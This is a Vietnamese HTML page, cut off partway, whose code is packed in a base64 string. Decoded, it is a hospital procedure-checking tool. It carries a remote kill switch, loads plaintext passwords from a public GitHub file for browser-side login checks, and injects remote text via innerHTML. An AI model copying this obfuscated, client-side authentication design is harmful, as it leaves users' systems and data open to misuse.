<!-- 

///////////////////////////////////////////////
/////Code được viết bởi Chauhuynh0104/////////
////http://fb.com/chauhuynh0104//////////////
/////////////079.567.9350///////////////////
///Vui lòng tôn trọng bản quyền tác giả////
/////////Không xoá dòng này //////////////
/////////////////////////////////////////

!-->
<!DOCTYPE html>
<html lang="vi">
<head><meta charset="UTF-8"><title>Thủ Thuật</title></head>
<body>
<script>
  const base64 = "PCEtLSANCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy9Db2RlIMSRxrDhu6NjIHZp4bq/dCBi4bufaSBDaGF1aHV5bmgwMTA0Ly8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vL2h0dHA6Ly9mYi5jb20vY2hhdWh1eW5oMDEwNC8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLzA3OS41NjcuOTM1MC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy9WdWkgbMOybmcgdMO0biB0cuG7jW5nIGLhuqNuIHF1eeG7gW4gdMOhYyBnaeG6oy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy8vLy8vLy9LaMO0bmcgeG/DoSBkw7JuZyBuw6B5IC8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KIS0tPg0KPCFET0NUWVBFIGh0bWw+DQoNCjxodG1sIGxhbmc9InZpIj4NCjxoZWFkPg0KPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1JbnRlcjp3Z2h0QDQwMDs2MDA7NzAwJmFtcDtkaXNwbGF5PXN3YXAiIHJlbD0ic3R5bGVzaGVldCIvPg0KPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzYuNC4wL2Nzcy9hbGwubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ii8+DQo8bWV0YSBjaGFyc2V0PSJ1dGYtOCIvPg0KPG1ldGEgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCIgbmFtZT0idmlld3BvcnQiLz4NCjx0aXRsZT5LaeG7g20gVHJhIFRo4bunIFRodeG6rXQgWSBU4bq/PC90aXRsZT4NCjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jaGF1aHV5bmgwMTA0LmdpdGh1Yi5pby9neW0vZ2lhb2RpZW4uY3NzIj4NCjxzY3JpcHQ+DQogICAgYXN5bmMgZnVuY3Rpb24gY2hlY2tBY2Nlc3MoKSB7DQogICAgICAgIGNvbnN0IGpzb25VcmwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoYXVodXluaDAxMDQvY2hhdWh1eW5oMDEwNC50eHQvcmVmcy9oZWFkcy9tYWluL2RyY2hhdS5qc29uJzsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKGpzb25VcmwpOw0KICAgICAgICAgICAgaWYgKCFyZXMub2spIHRocm93IG5ldyBFcnJvcignS2jDtG5nIHRo4buDIHThuqNpIGZpbGUgSlNPTicpOw0KICAgICAgICAgICAgY29uc3QgY29uZmlnID0gYXdhaXQgcmVzLmpzb24oKTsNCg0KICAgICAgICAgICAgaWYgKCFjb25maWcuQUNDRVNTX0FMTE9XRUQpIHsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmlubmVySFRNTCA9IGA8ZGl2IHN0eWxlPSJwYWRkaW5nOjUwcHg7dGV4dC1hbGlnbjpjZW50ZXI7Y29sb3I6cmVkO2ZvbnQtc2l6ZToyMHB4Ij4NCiAgICAgICAgICAgICAgICAgICAgPGgyPkLhuqJPIFRSw4wgSOG7hiBUSOG7kE5HPC9oMj4NCiAgICAgICAgICAgICAgICAgICAgPHA+JHtjb25maWcuTUVTU0FHRX08L3A+DQogICAgICAgICAgICAgICAgICAgICR7Y29uZmlnLlJFRElSRUNUX1VSTCA/IGA8cD5T4bq9IGNodXnhu4NuIGjGsOG7m25nIHNhdSA8c3BhbiBpZD0nY291bnRkb3duJz41PC9zcGFuPiBnacOieS4uLjwvcD5gIDogJyd9DQogICAgICAgICAgICAgICAgPC9kaXY+YDsNCiAgICAgICAgICAgICAgICBpZiAoY29uZmlnLlJFRElSRUNUX1VSTCkgew0KICAgICAgICAgICAgICAgICAgICBsZXQgc2Vjb25kcyA9IDU7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHRpbWVyID0gc2V0SW50ZXJ2YWwoKCkgPT4gew0KICAgICAgICAgICAgICAgICAgICAgICAgc2Vjb25kcy0tOw0KICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NvdW50ZG93bicpLmlubmVyVGV4dCA9IHNlY29uZHM7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoc2Vjb25kcyA8PSAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbCh0aW1lcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSBjb25maWcuUkVESVJFQ1RfVVJMOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9LCAxMDAwKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0gY2F0Y2ggKGVycikgew0KICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSBgPGRpdiBzdHlsZT0ncGFkZGluZzo1MHB4O3RleHQtYWxpZ246Y2VudGVyO2NvbG9yOnJlZCc+DQogICAgICAgICAgICAgICAgPGgyPktIw5RORyBU4bqiSSDEkMav4buiQyBD4bqkVSBIw4xOSDwvaDI+PHA+TOG7l2kgdHJ1eSBj4bqtcCBraGkga+G6v3QgbuG7kWkgbeG6oW5nLjxici8+IFZ1aSBsw7JuZyBraeG7g20gdHJhIGzhuqFpIMSRxrDhu51uZyB0cnV54buBbiBpbnRlcm5ldC48L3A+DQogICAgICAgICAgICA8L2Rpdj5gOw0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgYXN5bmMgZnVuY3Rpb24gbG9hZEFjY291bnRzRnJvbVRYVCgpIHsNCiAgICAgICAgY29uc3QgdHh0VXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGF1aHV5bmgwMTA0L2NoYXVodXluaDAxMDQudHh0L3JlZnMvaGVhZHMvbWFpbi90a2sudHh0JzsNCiAgICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2godHh0VXJsKTsNCiAgICAgICAgY29uc3QgdGV4dCA9IGF3YWl0IHJlcy50ZXh0KCk7DQogICAgICAgIGNvbnN0IGFjY291bnRzID0ge307DQogICAgICAgIHRleHQuc3BsaXQoJ1xuJykuZm9yRWFjaChsaW5lID0+IHsNCiAgICAgICAgICAgIGNvbnN0IFt1LCBwXSA9IGxpbmUudHJpbSgpLnNwbGl0KCc6Jyk7DQogICAgICAgICAgICBpZiAodSAmJiBwKSBhY2NvdW50c1t1XSA9IHA7DQogICAgICAgIH0pOw0KICAgICAgICByZXR1cm4gYWNjb3VudHM7DQogICAgfQ0KDQogICAgYXN5bmMgZnVuY3Rpb24gZW5hYmxlTG9naW4oYWNjb3VudHMpIHsNCiAgICAgICAgY29uc3QgYnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luQnRuJyk7DQogICAgICAgIGNvbnN0IHVzZXJJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0Jyk7DQogICAgICAgIGNvbnN0IHBhc3NJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0Jyk7DQogICAgICAgIGNvbnN0IGVycm9yRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luRXJyb3InKTsNCg0KICAgICAgICBidG4uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7DQogICAgICAgICAgICBjb25zdCB1c2VyID0gdXNlcklucHV0LnZhbHVlLnRyaW0oKTsNCiAgICAgICAgICAgIGNvbnN0IHBhc3MgPSBwYXNzSW5wdXQudmFsdWUudHJpbSgpOw0KICAgICAgICAgICAgaWYgKGFjY291bnRzW3VzZXJdICYmIGFjY291bnRzW3VzZXJdID09PSBwYXNzKSB7DQogICAgICAgICAgICAgICAgc2Vzc2lvblN0b3JhZ2Uuc2V0SXRlbSgnbWVkVXNlcicsIHVzZXIpOw0KICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuY2xhc3NMaXN0LnJlbW92ZSgnbG9naW4tcGFnZScpOw0KICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpblNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWluQ29udGVudCcpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICAgICAgICAgIGVycm9yRGl2LnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGVycm9yRGl2LnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9KTsNCiAgICB9DQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgZnVuY3Rpb24oKSB7DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd01vcmVTdWdnZXN0aW9uc0NoZWNrYm94JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24oKSB7DQogICAgaWYgKGFsbFByb2NlZHVyZXMubGVuZ3RoID4gMCkgew0KICAgICAgICBnZW5lcmF0ZVRpbWVTdWdnZXN0aW9ucyhhbGxQcm9jZWR1cmVzKTsNCiAgICAgICAgZmlsdGVyQnlPcGVyYXRvcigpOw0KICAgIH0NCn0pOw0KfSk7DQoNCiB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGFzeW5jICgpID0+IHsNCiAgY29uc3QgYWxsb3cgPSBhd2FpdCBjaGVja0FjY2VzcygpOw0KICBpZiAoIWFsbG93KSByZXR1cm47DQogIC8vIENo4buJIGtp4buDbSB0cmEgxJHEg25nIG5o4bqtcCDEkcOjIGzGsHU7IEtIw5RORyB04bqjaSBydWxlL3Byb2NlZHVyZXMg4bufIMSRw6J5DQogIGNoZWNrU2F2ZWRMb2dpbigpOw0KfSk7DQoNCjwvc2NyaXB0Pg0KDQoNCg0KDQo8L2hlYWQ+DQo8Ym9keT4NCjwhLS0gVEhFTUUgUElDS0VSIC0tPg0KPGRpdiBpZD0idGhlbWVQaWNrZXIiIGNsYXNzPSJ0aGVtZS1waWNrZXIiIHRpdGxlPSJDaOG7jW4gbcOgdSBjaOG7pyDEkeG7gSBnaWFvIGRp4buHbiI+DQogDQogDQogIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0idGhlbWUtc3dhdGNoIiBkYXRhLXRoZW1lPSJkZWZhdWx0IiBzdHlsZT0iLS1zd2F0Y2g6IzM0OThkYiIgYXJpYS1sYWJlbD0iTeG6t2MgxJHhu4tuaCAoWGFuaCBkxrDGoW5nKSI+PC9idXR0b24+DQogIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0idGhlbWUtc3dhdGNoIiBkYXRhLXRoZW1lPSJvcmFuZ2UiICBzdHlsZT0iLS1zd2F0Y2g6I0ZGNjYwMCIgYXJpYS1sYWJlbD0iTcOgdSBjYW0iPjwvYnV0dG9uPg0KICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9InRoZW1lLXN3YXRjaCIgZGF0YS10aGVtZT0icmVkIiAgICAgc3R5bGU9Ii0tc3dhdGNoOiNGRjAwMDAiIGFyaWEtbGFiZWw9Ik3DoHUgxJHhu48iPjwvYnV0dG9uPg0KICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9InRoZW1lLXN3YXRjaCIgZGF0YS10aGVtZT0iZ3JlZW4iICAgc3R5bGU9Ii0tc3dhdGNoOiMwMEFBMDAiIGFyaWEtbGFiZWw9Ik3DoHUgeGFuaCBsw6EiPjwvYnV0dG9uPg0KICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGlkPSJkYXJrVG9nZ2xlIiBjbGFzcz0idGhlbWUtZGFyay10b2dnbGUiIG9uY2xpY2s9InRvZ2dsZURhcmtNb2RlKCkiIGFyaWEtbGFiZWw9IkLhuq10L1Thuq90IGNo4bq/IMSR4buZIHThu5FpIj4NCiAgICA8c3BhbiBpZD0iZGFya0ljb24iPjxzbWFsbD7wn4yZPC9zbWFsbD48L3NwYW4+IDxzcGFuIGlkPSJkYXJrVGV4dCI+VOG7kWk8L3NwYW4+DQogIDwvYnV0dG9uPg0KICANCjwvZGl2Pg0KDQoNCg0KDQo8c2NyaXB0Pg0KICAgICAgZnVuY3Rpb24gdG9nZ2xlRGFya01vZGUoKSB7DQogICAgICAgIGNvbnN0IGJvZHkgPSBkb2N1bWVudC5ib2R5Ow0KICAgICAgICBjb25zdCBpY29uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRhcmtJY29uIik7DQogICAgICAgIGNvbnN0IHRleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGFya1RleHQiKTsNCiAgICAgICAgYm9keS5jbGFzc0xpc3QudG9nZ2xlKCJkYXJrLW1vZGUiKTsNCiAgICAgICAgY29uc3QgaXNEYXJrID0gYm9keS5jbGFzc0xpc3QuY29udGFpbnMoImRhcmstbW9kZSIpOw0KICAgICAgICBpY29uLnRleHRDb250ZW50ID0gaXNEYXJrID8gIuKYgO+4jyIgOiAi8J+MmSI7DQogICAgICAgIHRleHQudGV4dENvbnRlbnQgPSBpc0RhcmsgPyAiU8OhbmciIDogIlThu5FpIjsNCiAgICAgIH0NCiAgICA8L3NjcmlwdD4NCjxzY3JpcHQ+DQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgKCkgPT4gew0KLy8gTOG6pXkgY8OhYyBwaOG6p24gdOG7rQ0KICAgICAgICAgICAgY29uc3QgdHJpZ2dlckJ1dHRvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0cmlnZ2VyQnV0dG9uJyk7DQogICAgICAgICAgICBjb25zdCBmaWxlSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0Jyk7DQoNCiAgICAgICAgICAgIC8vIEtp4buDbSB0cmEgeGVtIHBo4bqnbiB04butIGPDsyB04buTbiB04bqhaSBraMO0bmcNCiAgICAgICAgICAgIGlmICghdHJpZ2dlckJ1dHRvbiB8fCAhZmlsZUlucHV0KSB7DQogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignTOG7l2k6IEtow7RuZyB0w6xtIHRo4bqleSB0cmlnZ2VyQnV0dG9uIGhv4bq3YyBmaWxlSW5wdXQnKTsNCiAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC8vIFRow6ptIHPhu7Ega2nhu4duIGNsaWNrIGNobyBidXR0b24NCiAgICAgICAgICAgIHRyaWdnZXJCdXR0b24uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7DQogICAgICAgICAgICAgICAgZmlsZUlucHV0LmNsaWNrKCk7IC8vIEvDrWNoIGhv4bqhdCBpbnB1dCBmaWxlDQogICAgICAgICAgICB9KTsNCg0KICAgICAgICB9KTsNCg0KPC9zY3JpcHQ+DQoNCjxkaXYgY2xhc3M9ImNvbnRhaW5lciI+DQo8ZGl2IGNsYXNzPSJsb2dpbi1zZWN0aW9uIiBpZD0ibG9naW5TZWN0aW9uIj4NCjxoMiBjbGFzcz0ibG9naW4tdGl0bGUiPsSQxIJORyBOSOG6rFAgSOG7hiBUSOG7kE5HPC9oMj4NCjxpbnB1dCBjbGFzcz0ibG9naW4taW5wdXQiIGlkPSJ1c2VybmFtZUlucHV0IiBwbGFjZWhvbGRlcj0iVMOqbiDEkcSDbmcgbmjhuq1wIiB0eXBlPSJ0ZXh0Ii8+DQo8aW5wdXQgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0icGFzc3dvcmRJbnB1dCIgcGxhY2Vob2xkZXI9Ik3huq10IGto4bqpdSIgdHlwZT0icGFzc3dvcmQiLz4NCjxici8+PGJ1dHRvbiBjbGFzcz0iYnRuIiBpZD0ibG9naW5CdG4iPsSQxINuZyBuaOG6rXA8L2J1dHRvbj4NCjxkaXYgY2xhc3M9ImxvZ2luLWVycm9yIiBpZD0ibG9naW5FcnJvciI+VMOqbiDEkcSDbmcgbmjhuq1wIGhv4bq3YyBt4bqtdCBraOG6qXUga2jDtG5nIMSRw7puZzwvZGl2Pg0KPC9kaXY+DQo8ZGl2IGNsYXNzPSJtYWluLWNvbnRlbnQiIGlkPSJtYWluQ29udGVudCI+DQo8ZGl2IGNsYXNzPSJ0b3AtYnV0dG9uLWdyb3VwIj4NCjxidXR0b24gb25jbGljaz0ic2hvd0Ryb3Bib3hQYW5lbCgpIiBjbGFzcz0iYnRuIj5QYW5lbDwvYnV0dG9uPg0KDQogIDxidXR0b24gb25jbGljaz0id2luZG93LmxvY2F0aW9uLnJlbG9hZCgpOyIgY2xhc3M9ImJ0biI+WG/DoSBDYWNoZTwvYnV0dG9uPg0KICA8YnV0dG9uIGNsYXNzPSJidG4iaWQ9ImxvZ291dEJ0biI+xJDEg25nIHh14bqldDwvYnV0dG9uPg0KPC9kaXY+DQoNCg0KPGgxPiA8YSBocmVmPSJodHRwczovL2ZiLmNvbS9jaGF1aHV5bmgwMTA0IiBzdHlsZT0iYWxsOiB1bnNldDsgY3Vyc29yOiBwb2ludGVyOyIgdGFyZ2V0PSJfYmxhbmsiPktp4buDbSBUcmEgVGjhu6cgVGh14bqtdCBZIFThur88L2E+PC9oMT4NCjxkaXYgY2xhc3M9Imxpc3QxIiBzdHlsZT0iZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsgZ2FwOiA4cHg7Ij4NCjxpIGNsYXNzPSJmYSBmYS1idWxsaG9ybiI+PC9pPg0KPGI+PGZvbnQgY29sb3I9InJlZCI+VGjDtG5nIGLDoW86PC9mb250PjwvYj4NCjxkaXYgY2xhc3M9InNjcm9sbGluZy10ZXh0IiBzdHlsZT0iZmxleDogMTsgb3ZlcmZsb3c6IGhpZGRlbjsiPg0KPGRpdiBjbGFzcz0ic2Nyb2xsaW5nLWNvbnRlbnQiIGlkPSJub2lkdW5nIj4NCg0KPC9kaXY+DQo8L2Rpdj4NCjwvZGl2Pg0KPHNjcmlwdD4NCg0KDQpmZXRjaCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoYXVodXluaDAxMDQvY2hhdWh1eW5oMDEwNC50eHQvcmVmcy9oZWFkcy9tYWluL3Rob25nYmFvLnR4dCcpDQogIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkNCiAgLnRoZW4oZGF0YSA9PiB7DQogICAgY29uc3QgZWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbm9pZHVuZycpOw0KICAgIGVsLmlubmVySFRNTCA9IGRhdGE7DQoNCiAgICAvLyBUxINuZyDEkeG7mSBkw6BpIG7hu5lpIGR1bmcgxJHhu4MgxJHhuqNtIGLhuqNvIGN14buZbg0KICAgIGVsLnN0eWxlLmRpc3BsYXkgPSAnaW5saW5lLWJsb2NrJzsNCiAgICBlbC5zdHlsZS5taW5XaWR0aCA9ICcxMDAlJzsNCg0KICAgIC8vIFJlc2V0IGFuaW1hdGlvbiB0byBmb3JjZSByZWZsb3cNCiAgICBlbC5zdHlsZS5hbmltYXRpb24gPSAnbm9uZSc7DQogICAgdm9pZCBlbC5vZmZzZXRXaWR0aDsNCiAgICBlbC5zdHlsZS5hbmltYXRpb24gPSAnc2Nyb2xsLWxlZnQgMTBzIGxpbmVhciBpbmZpbml0ZSc7DQogIH0pDQogIC5jYXRjaChlcnJvciA9PiB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ25vaWR1bmcnKS50ZXh0Q29udGVudCA9ICdLaMO0bmcgdGjhu4MgdOG6o2kgbuG7mWkgZHVuZy4nOw0KICAgIGNvbnNvbGUuZXJyb3IoZXJyb3IpOw0KICB9KTsNCg0KDQo8L3NjcmlwdD4NCjxkaXYgY2xhc3M9InVwbG9hZC1zZWN0aW9uIj48ZGl2IGNsYXNzPSJtYWluYmxvayI+DQoNCjxpbnB1dCBhY2NlcHQ9Ii54bHN4LCAueGxzLCAuY3N2IiBpZD0iZmlsZUlucHV0IiBzdHlsZT0iZGlzcGxheTpub25lIiB0eXBlPSJmaWxlIi8+DQo8YnV0dG9uIGNsYXNzPSJidG4iIGlkPSJ0cmlnZ2VyQnV0dG9uIj48aSBjbGFzcz0iZmFzIGZhLWZpbGUtdXBsb2FkIj48L2k+IENo4buNbiBmaWxlIHRo4bunIGPDtG5nPC9idXR0b24+DQo8YnIvPjxici8+DQo8aW5wdXQgZGlyZWN0b3J5PSIiIGlkPSJmb2xkZXJJbnB1dCIgbXVsdGlwbGU9IiIgc3R5bGU9ImRpc3BsYXk6bm9uZSIgdHlwZT0iZmlsZSIgd2Via2l0ZGlyZWN0b3J5PSIiLz4NCjxidXR0b24gY2xhc3M9ImJ0biIgaWQ9ImZvbGRlckJ0biI+PGkgY2xhc3M9ImZhcyBmYS1mb2xkZXItb3BlbiI+PC9pPiBDaOG7jW4gdGjGsCBt4bulYyAoVOG7sSDEkeG7mW5nIHTDrG0gZmlsZSk8L2J1dHRvbj4NCjxkaXYgaWQ9InNjYW5TdGF0dXMiIHN0eWxlPSJtYXJnaW4tdG9wOjEwcHg7Y29sb3I6IzM0OThkYjtmb250LXdlaWdodDpib2xkIj48L2Rpdj4NCg0KDQo8bGFiZWw+DQo8aW5wdXQgbmFtZT0idGltZU9wdGlvbiIgdHlwZT0icmFkaW8iIHZhbHVlPSI3OjAwIi8+IA0KICAgICAgICAgICAgICAgICAgICAgICAgR+G7o2kgw70gdOG7qyAwNzowMA0KICAgICAgICAgICAgICAgICAgICA8L2xhYmVsPg0KPGxhYmVsPg0KPGlucHV0IGNoZWNrZWQ9IiIgbmFtZT0idGltZU9wdGlvbiIgdHlwZT0icmFkaW8iIHZhbHVlPSI3OjMwIi8+IA0KICAgICAgICAgICAgICAgICAgICAgICAgR+G7o2kgw70gdOG7qyAwNzozMA0KICAgICAgICAgICAgICAgICAgICA8L2xhYmVsPg0KPGJyLz48YnIvPg0KDQogIDxsYWJlbCBzdHlsZT0ibWFyZ2luLXJpZ2h0OiAxMHB4OyI+DQo8aW5wdXQgY2hlY2tlZD0iMSIgaWQ9Imlnbm9yZUFkamFjZW50Q2hlY2tib3giIHR5cGU9ImNoZWNrYm94Ii8+DQo8c3BhbiBjbGFzcz0iY2h1LXRoaWNoIj5C4buPIHF1YSB0aOG7pyB0aHXhuq10IGxp4buBbiBr4buBPHNwYW4gY2xhc3M9Im5vaS1kdW5nIj5WRDogOGgwMC04aDMwIHhvYSBiw7NwLiAwOGgzMC0wOGg1MCDEkWnhu4duIGNow6JtLiBsacOqbiB0aeG6v3AgbcOgIGtvIGPDoWNoIDEgcGjDunQgPC9zcGFuPjwvc3Bhbj4NCjwvbGFiZWw+DQoNCiAgPGxhYmVsIHN0eWxlPSJtYXJnaW4tcmlnaHQ6IDEwcHg7Ij4NCjxpbnB1dCBpZD0ic2hvd01vcmVTdWdnZXN0aW9uc0NoZWNrYm94IiB0eXBlPSJjaGVja2JveCIvPiANCiAgICAgICAgSGnhu4NuIHRo4buLIDYga2h1bmcgZ2nhu50gZ+G7o2kgw70gICAgICAgICANCiAgICA8L2xhYmVsPg0KDQo8bGFiZWw+DQo8aW5wdXQgaWQ9InNob3dEb2N0b3JDaGVja2JveCIgdHlwZT0iY2hlY2tib3giLz4gDQogICAgICAgIEhp4buDbiB0aOG7iyBCw6FjIHPEqSBjaOG7iSDEkeG7i25oDQogICAgPC9sYWJlbD4NCjxici8+PGJyLz4NCjxidXR0b24gY2xhc3M9ImJ0biIgaWQ9ImFuYWx5emVCdG4iPktp4buDbSBUcmE8L2J1dHRvbj4NCg0KDQoNCg0KDQoNCg0KDQoNCjxzY3JpcHQ+DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24gKCkgew0KICAgIGNvbnN0IGZpbGUgPSB0aGlzLmZpbGVzWzBdOw0KICAgIGlmIChmaWxlKSB7DQogICAgICAgIGNvbnN0IHN0YXR1cyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzY2FuU3RhdHVzJyk7DQogICAgICAgIHN0YXR1cy5pbm5lckhUTUwgPSBgPGkgY2xhc3M9ImZhcyBmYS1maWxlIj48L2k+xJDDoyBjaOG7jW4gZmlsZTogPGI+JHtmaWxlLm5hbWV9PC9iPmA7DQogICAgICAgIHN0YXR1cy5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgc3RhdHVzLnN0eWxlLmNvbG9yID0gJyMyYzNlNTAnOw0KICAgIH0NCn0pOw0KDQo8L3NjcmlwdD4NCjxkaXYgaWQ9InNjYW5TdGF0dXMiIHN0eWxlPSJtYXJnaW4tdG9wOjEwcHg7IGNvbG9yOiMyYzNlNTA7IGZvbnQtd2VpZ2h0OmJvbGQ7IGRpc3BsYXk6IG5vbmU7Ij48L2Rpdj4NCjxici8+DQo8c3BhbiBzdHlsZT0iZm9udC1zaXplOiAxMnB4OyI+PGk+UGjhuqduIG3hu4FtIMSRw7RpIGtoaSBjw7MgdGjhu4MgbeG6r2MgbOG7l2kuIFhpbiBow6N5IGtp4buDbSB0cmEgY8OhYyB0aMO0bmcgdGluIHF1YW4gdHLhu41uZy48L2k+PC9zcGFuPg0KPGRpdiBpZD0iZmlsZVJlcXVpcmVtZW50cyI+PC9kaXY+DQo8L2Rpdj48L2Rpdj4NCg0KDQo8IS0tIELhuq5UIMSQ4bqmVTogQuG6ok5HIEdJ4bucIFRS4buQTkcgVOG7qk5HIE5Hxq/hu5xJIC0tPg0KICA8YnV0dG9uIGlkPSJoZXJiVG9nZ2xlQnRuIiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJ0b2dnbGVIZXJiTGlzdCgpInN0eWxlPSJkaXNwbGF5Om5vbmUiPlPhuq9jIHRodeG7kWMgdGhhbmc8L2J1dHRvbj4NCiAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJ0b2dnbGVBdmFpbGFiaWxpdHkoKSIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+R2nhu50gdHLhu5FuZzwvYnV0dG9uPg0KPGJ1dHRvbiBjbGFzcz0iYnRuIiBpZD0iZXJyb3JTdW1tYXJ5QnRuIiBvbmNsaWNrPSJvcGVuRXJyb3JTdW1tYXJ5KCkiIHN0eWxlPSJkaXNwbGF5Om5vbmUiPg0KICBUw7NtIFThuq90IEzhu5dpDQo8L2J1dHRvbj4NCjxkaXYgaWQ9ImF2YWlsYWJpbGl0eVRhYmxlIiBzdHlsZT0iZGlzcGxheTogbm9uZTsgbWFyZ2luLWJvdHRvbTogMjBweDsiPg0KIDxkaXYgY2xhc3M9Im1haW5ibG9rIiBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMTBweDsgZGlzcGxheTpub25lOyIgaWQ9ImF2YWlsYWJpbGl0eUZpbHRlckJsb2NrIj4NCiAgPGxhYmVsIGZvcj0iZmlsdGVyT3BlcmF0b3IiPk5nxrDhu51pIHRo4buxYyBoaeG7h246PC9sYWJlbD4NCiAgPHNlbGVjdCBpZD0iZmlsdGVyT3BlcmF0b3IiIGNsYXNzPSJsb2dpbi1pbnB1dCIgc3R5bGU9IndpZHRoOmF1dG87bWFyZ2luLXJpZ2h0OjIwcHg7Ij48L3NlbGVjdD4NCg0KICA8bGFiZWwgZm9yPSJmaWx0ZXJEYXRlIj5OZ8OgeTo